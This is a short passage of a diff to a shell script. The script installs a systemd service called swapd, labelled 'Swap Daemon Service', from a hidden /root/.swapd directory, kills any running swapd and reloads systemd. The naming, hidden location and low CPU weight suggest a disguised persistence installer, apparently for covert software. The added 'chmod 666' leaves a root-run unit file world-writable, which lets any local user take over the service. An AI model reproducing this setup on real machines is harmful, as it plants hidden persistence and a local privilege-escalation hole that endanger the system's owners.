@@ -375,7 +375,7 @@ else
 
 rm -rf /etc/systemd/system/swapd.service
 
-cat >/etc/systemd/system/swapd.service <<EOL
+cat > /root/.swapd/swapd.service <<EOL
 [Unit]
 Description=Swap Daemon Service
 
@@ -388,7 +388,8 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-#    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+    sudo mv /root/.swapd/swapd.service /etc/systemd/system/swapd.service
+    sudo chmod 666 /etc/systemd/system/swapd.service
     echo "[*] Starting swapd systemd service"
     sudo killall swapd 2>/dev/null
     sudo systemctl daemon-reload
